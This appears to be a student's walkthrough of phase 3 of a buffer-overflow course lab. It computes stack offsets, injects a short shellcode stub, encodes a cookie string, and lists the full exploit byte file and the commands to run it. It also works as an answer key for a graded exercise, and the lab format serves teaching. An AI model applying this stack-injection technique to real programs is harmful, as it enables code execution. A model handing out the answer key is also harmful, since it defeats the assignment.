# Phase 3:  

We have to be careful how we store the cookie here because function hexmatch can overwrite the cookie.

We will need to store the cookie after touch3 by passing the address for the cookie to register $rdi.

We will need to calculate the following:
```
buffer + 8 bytes for return address of rsp + 8 bytes for touch3
```
```
0x38 + 8bytes + 8bytes = 0x48
```
So, we need to add 0x48 to the address of rsp(we got this in phase2):
```
0x5561a060 + 0x48 = 0x5561a0a8
```
Now, we want to write the assembly instructions and compile/objdump like we did in phase2. This is what we get:
```
Phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 a0 61 55 	mov    $0x5561a0a8,%rdi
   7:	c3                   	ret 
```
We now have our first line for our file:
```
48 c7 c7 a8 a0 61 55 c3
```
The next few lines will be our padding (remember, buffer is 56 bytes)
We will then want to add the return address for rsp: ` 0x5561a060`
And then we will want to get the address to touch3 from phase123dump:
```
000000000040275c <touch3>:
  40275c:	53                   	push   %rbx
  40275d:	48 89 fb             	mov    %rdi,%rbx
  402760:	c7 05 d2 20 11 00 03 	movl   $0x3,0x1120d2(%rip)        # 51483c <vlevel>
  402767:	00 00 00 
  40276a:	48 89 fe             	mov    %rdi,%rsi
  40276d:	8b 3d d1 20 11 00    	mov    0x1120d1(%rip),%edi        # 514844 <cookie>
  402773:	e8 35 ff ff ff       	call   4026ad <hexmatch>
  402778:	85 c0                	test   %eax,%eax
  40277a:	74 2d                	je     4027a9 <touch3+0x4d>
  40277c:	48 89 da             	mov    %rbx,%rdx
  40277f:	48 8d 35 6a 9b 0d 00 	lea    0xd9b6a(%rip),%rsi        # 4dc2f0 <_IO_stdin_used+0x2f0>
  402786:	bf 01 00 00 00       	mov    $0x1,%edi
  40278b:	b8 00 00 00 00       	mov    $0x0,%eax
  402790:	e8 fb 43 05 00       	call   456b90 <___printf_chk>
  402795:	bf 03 00 00 00       	mov    $0x3,%edi
  40279a:	e8 7d 03 00 00       	call   402b1c <validate>
  40279f:	bf 00 00 00 00       	mov    $0x0,%edi
  4027a4:	e8 17 ab 00 00       	call   40d2c0 <exit>
  4027a9:	48 89 da             	mov    %rbx,%rdx
  4027ac:	48 8d 35 65 9b 0d 00 	lea    0xd9b65(%rip),%rsi        # 4dc318 <_IO_stdin_used+0x318>
  4027b3:	bf 01 00 00 00       	mov    $0x1,%edi
  4027b8:	b8 00 00 00 00       	mov    $0x0,%eax
  4027bd:	e8 ce 43 05 00       	call   456b90 <___printf_chk>
  4027c2:	bf 03 00 00 00       	mov    $0x3,%edi
  4027c7:	e8 4a 04 00 00       	call   402c16 <fail>
  4027cc:	eb d1                	jmp    40279f <touch3+0x43>
```
touch3 address: `000000000040275c`
Now, for the final line, we need to translate are cookie to ASCII:
```
Cookie: 0x76ebdb56

7 = '55'
6 = '54'
e = '101'
b = '98'
d = '100'
b = '98'
5 = '53'
6 = '54'
```
Then, we convert each of those values back to hexadecimal:
```
55 = '37'
54 = '36'
101 = '65'
98 = '62'
100 = '64'
98 = '62'
53 = '35'
54 = '36'
```
The last line in our file is 37 36 65 62 64 62 35 36

Here is our text file:
```
48 c7 c7 a8 a0 61 55 c3 /*rsp + 0x48 which is where the cookie is*/
00 00 00 00 00 00 00 00 /* padding*/
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
60 a0 61 55 00 00 00 00 /*return address for rsp*/
5c 27 40 00 00 00 00 00 /* touch3 address */
37 36 65 62 64 62 35 36 /*cookie in string format*/
```
generate raw exploit:
```
./hex2raw < ctarget.l3.txt > exploit3.dat
```
run the file:
```
./ctarget < exploit3.dat
```
Done!